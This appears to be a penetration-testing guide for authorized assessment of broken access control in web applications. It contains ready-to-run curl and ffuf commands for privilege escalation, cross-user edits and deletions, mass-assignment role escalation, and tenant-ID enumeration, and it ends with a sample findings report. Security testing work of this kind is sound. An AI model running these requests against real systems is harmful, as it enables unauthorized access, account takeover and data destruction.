---
name: testing-for-broken-access-control
description: Systematically testing web applications for broken access control vulnerabilities including privilege escalation, missing function-level checks, and insecure direct object references.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, access-control, authorization, owasp, privilege-escalation, web-security]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for Broken Access Control

## When to Use

- During authorized penetration tests as the primary assessment for OWASP A01:2021 - Broken Access Control
- When evaluating role-based access control (RBAC) implementations across all application endpoints
- For testing multi-tenant applications where users in one organization should not access another's data
- When assessing API endpoints for missing or inconsistent authorization checks
- During security audits where privilege escalation and unauthorized access are primary concerns

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: With Authorize extension for automated access control testing
- **Multiple test accounts**: Accounts at each role level (admin, manager, user, guest)
- **Application role matrix**: Documentation of what each role should and should not access
- **curl/httpie**: For manual endpoint testing with different authentication contexts
- **ffuf**: For discovering hidden endpoints that may lack access controls

## Workflow

### Step 1: Map All Endpoints and Create Access Control Matrix

Document every endpoint and the expected access level for each role.

```bash
# Extract all endpoints from Burp Site Map
# Target > Site Map > Right-click > Copy URLs in this host

# Build a matrix of endpoints vs roles:
# | Endpoint              | Admin | Manager | User | Guest |
# |-----------------------|-------|---------|------|-------|
# | GET /admin/dashboard  | Allow | Deny    | Deny | Deny  |
# | GET /api/users        | Allow | Allow   | Deny | Deny  |
# | PUT /api/users/{id}   | Allow | Deny    | Own  | Deny  |
# | DELETE /api/posts/{id} | Allow | Allow   | Own  | Deny  |

# Discover hidden endpoints
ffuf -u "https://target.example.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 -fc 404 \
  -H "Authorization: Bearer $USER_TOKEN" \
  -o endpoints.json -of json

# API endpoint discovery
ffuf -u "https://target.example.com/api/v1/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405 -fc 404 \
  -H "Authorization: Bearer $USER_TOKEN"
```

### Step 2: Configure Automated Access Control Testing

Set up Burp Authorize extension for parallel role-based testing.

```
# Install Authorize extension:
# Burp > Extender > BApp Store > Search "Authorize" > Install

# Configuration for three-tier testing:
# 1. Browse the application as Admin (capture all requests)
# 2. In Authorize tab:
#    a. Add Regular User's session token in "Replace cookies/headers"
#    b. Optionally add a second row for Unauthenticated (no auth header)

# Example header replacement setup:
# Row 1 (Low-privilege user):
#   Cookie: session=low_priv_user_session
#   Authorization: Bearer low_priv_token
#
# Row 2 (Unauthenticated):
#   [Empty - removes all auth headers]

# Enable interception in Authorize:
# - Check "Intercept requests from Proxy"
# - Check "Intercept requests from Repeater"

# Authorize shows results as:
# Green  = Properly restricted (different response for different user)
# Red    = POTENTIALLY VULNERABLE (same response regardless of role)
# Orange = Uncertain (needs manual verification)
```

### Step 3: Test Vertical Privilege Escalation

Attempt to access higher-privilege functionality with lower-privilege accounts.

```bash
# Collect tokens for each role
ADMIN_TOKEN="Bearer admin_jwt_here"
MANAGER_TOKEN="Bearer manager_jwt_here"
USER_TOKEN="Bearer user_jwt_here"

# Test admin endpoints with user token
ADMIN_ENDPOINTS=(
  "GET /admin/dashboard"
  "GET /admin/users"
  "POST /admin/users/create"
  "PUT /admin/settings"
  "DELETE /admin/users/5"
  "GET /admin/logs"
  "GET /admin/reports/export"
  "POST /admin/backup"
)

for entry in "${ADMIN_ENDPOINTS[@]}"; do
  method=$(echo "$entry" | cut -d' ' -f1)
  endpoint=$(echo "$entry" | cut -d' ' -f2)
  echo -n "$method $endpoint (as user): "
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" \
    -H "Authorization: $USER_TOKEN" \
    -H "Content-Type: application/json" \
    "https://target.example.com$endpoint")
  if [ "$status" == "200" ] || [ "$status" == "201" ]; then
    echo "VULNERABLE ($status)"
  else
    echo "OK ($status)"
  fi
done

# Test with method override headers
curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Authorization: $USER_TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  "https://target.example.com/admin/users/5"

# Test with different HTTP methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo -n "$method /admin/users: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" \
    -H "Authorization: $USER_TOKEN" \
    "https://target.example.com/admin/users"
  echo
done
```

### Step 4: Test Horizontal Privilege Escalation

Verify that users cannot access resources belonging to other users at the same privilege level.

```bash
# User A (ID: 101) testing access to User B's (ID: 102) resources
USER_A_TOKEN="Bearer user_a_jwt"

RESOURCES=(
  "/api/users/102/profile"
  "/api/users/102/orders"
  "/api/users/102/messages"
  "/api/users/102/documents"
  "/api/users/102/settings"
  "/api/users/102/payment-methods"
)

for resource in "${RESOURCES[@]}"; do
  echo -n "GET $resource: "
  response=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: $USER_A_TOKEN" \
    "https://target.example.com$resource")
  status=$(echo "$response" | tail -1)
  body_len=$(echo "$response" | head -n -1 | wc -c)
  if [ "$status" == "200" ] && [ "$body_len" -gt 50 ]; then
    echo "VULNERABLE ($status, $body_len bytes)"
  else
    echo "OK ($status)"
  fi
done

# Test write operations across users
curl -s -X PUT \
  -H "Authorization: $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked","email":"hacked@evil.com"}' \
  "https://target.example.com/api/users/102/profile" -w "%{http_code}"

# Test delete operations
curl -s -X DELETE \
  -H "Authorization: $USER_A_TOKEN" \
  "https://target.example.com/api/users/102/documents/1" -w "%{http_code}"
```

### Step 5: Test Function-Level Access Control

Verify that specific functions enforce authorization properly.

```bash
# Test unauthenticated access to protected endpoints
PROTECTED_ENDPOINTS=(
  "/api/user/profile"
  "/api/transactions"
  "/api/settings"
  "/admin/dashboard"
  "/api/export/users"
)

for endpoint in "${PROTECTED_ENDPOINTS[@]}"; do
  echo -n "No auth: GET $endpoint: "
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com$endpoint"
  echo
done

# Test with expired/invalid tokens
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer invalid_token_here" \
  "https://target.example.com/api/user/profile"

# Test role manipulation in JWT claims
# If JWT contains role claim, try modifying it
# (requires JWT vulnerability - see JWT testing skill)

# Test parameter-based role escalation
curl -s -X PUT \
  -H "Authorization: $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":["admin","superuser"]}' \
  "https://target.example.com/api/users/101/profile"

# Test registration with elevated role
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"new@test.com","password":"Test123!","role":"admin"}' \
  "https://target.example.com/api/auth/register"
```

### Step 6: Test Multi-Tenant Isolation

Verify that tenant boundaries are enforced in multi-tenant applications.

```bash
# User in Tenant A testing access to Tenant B's resources
TENANT_A_TOKEN="Bearer tenant_a_user_jwt"

# Direct tenant resource access
curl -s -H "Authorization: $TENANT_A_TOKEN" \
  "https://target.example.com/api/organizations/tenant-b-id/users" | jq .

curl -s -H "Authorization: $TENANT_A_TOKEN" \
  "https://target.example.com/api/organizations/tenant-b-id/settings" | jq .

# Test tenant switching via header
curl -s -H "Authorization: $TENANT_A_TOKEN" \
  -H "X-Tenant-ID: tenant-b-id" \
  "https://target.example.com/api/users" | jq .

# Test tenant ID in request body
curl -s -X POST \
  -H "Authorization: $TENANT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"tenant_id":"tenant-b-id","query":"SELECT * FROM users"}' \
  "https://target.example.com/api/reports/custom"

# Enumerate tenant IDs
ffuf -u "https://target.example.com/api/organizations/FUZZ" \
  -w <(seq 1 100) \
  -H "Authorization: $TENANT_A_TOKEN" \
  -mc 200 -t 10 -rate 20
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Vertical Privilege Escalation** | Lower-privilege user accessing higher-privilege functionality (user -> admin) |
| **Horizontal Privilege Escalation** | User accessing another user's resources at the same privilege level |
| **Function-Level Access Control** | Authorization checks on specific features/functions regardless of URL |
| **RBAC** | Role-Based Access Control - permissions assigned to roles, roles assigned to users |
| **ABAC** | Attribute-Based Access Control - permissions based on user/resource/environment attributes |
| **Multi-Tenant Isolation** | Ensuring data and functionality separation between different organizations/tenants |
| **Insecure Direct Object Reference** | Accessing objects by manipulating identifiers without authorization checks |
| **Missing Function-Level Check** | Endpoint exists but does not verify the caller has permission to invoke it |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and role-based testing |
| **Authorize (Burp Extension)** | Automated access control testing across sessions |
| **AutoRepeater (Burp Extension)** | Automatically replays requests with different auth contexts |
| **Postman** | API testing with environment switching between roles |
| **ffuf** | Discovering hidden endpoints that may lack access controls |
| **OWASP ZAP** | Access control testing with context-aware scanning |

## Common Scenarios

### Scenario 1: Admin Panel Without Auth Check
The `/admin/dashboard` endpoint returns the admin panel when accessed with a regular user's session token. The front-end hides the admin menu, but the back-end does not enforce role checks.

### Scenario 2: API Endpoint Missing Authorization
The `DELETE /api/users/{id}` endpoint checks for authentication (valid token) but not authorization (admin role). Any authenticated user can delete any other user's account.

### Scenario 3: Tenant Data Leakage
A SaaS application uses `tenant_id` in API request headers. Changing the `X-Tenant-ID` header to another tenant's ID returns their data, bypassing tenant isolation.

### Scenario 4: Mass Assignment Role Escalation
The user profile update endpoint at `PUT /api/users/{id}` accepts a `role` field in the JSON body. Submitting `"role":"admin"` alongside a profile update elevates the user to administrator.

## Output Format

```
## Broken Access Control Assessment Report

**Target**: target.example.com
**Assessment Date**: 2024-01-15
**OWASP Category**: A01:2021 - Broken Access Control

### Access Control Matrix Results
| Endpoint | Admin | Manager | User | Guest | Expected | Actual |
|----------|-------|---------|------|-------|----------|--------|
| GET /admin/dashboard | 200 | 200 | 200 | 302 | Admin only | FAIL |
| DELETE /api/users/{id} | 200 | 200 | 200 | 401 | Admin only | FAIL |
| GET /api/users/other/profile | 200 | 200 | 200 | 401 | Own only | FAIL |
| PUT /api/users/other/settings | 200 | 200 | 200 | 401 | Own only | FAIL |
| GET /api/org/other-tenant | 200 | 200 | 200 | 401 | Same tenant | FAIL |

### Critical Findings
1. **Vertical Escalation**: Regular users can access /admin/* endpoints
2. **Horizontal IDOR**: Users can read/modify other users' profiles
3. **Tenant Isolation**: Cross-tenant data access via header manipulation
4. **Mass Assignment**: Role escalation via profile update endpoint

### Impact
- Complete administrative access for any authenticated user
- Full user data access across all accounts (15,000+ users)
- Cross-tenant data breach affecting 200+ organizations
- Account takeover via profile modification

### Recommendation
1. Implement server-side authorization checks on every endpoint
2. Use a centralized authorization middleware/framework
3. Enforce object-level authorization (verify ownership before access)
4. Validate tenant context server-side, never from client headers
5. Use allowlists for mass assignment (only permit expected fields)
6. Implement audit logging for all access control decisions
```
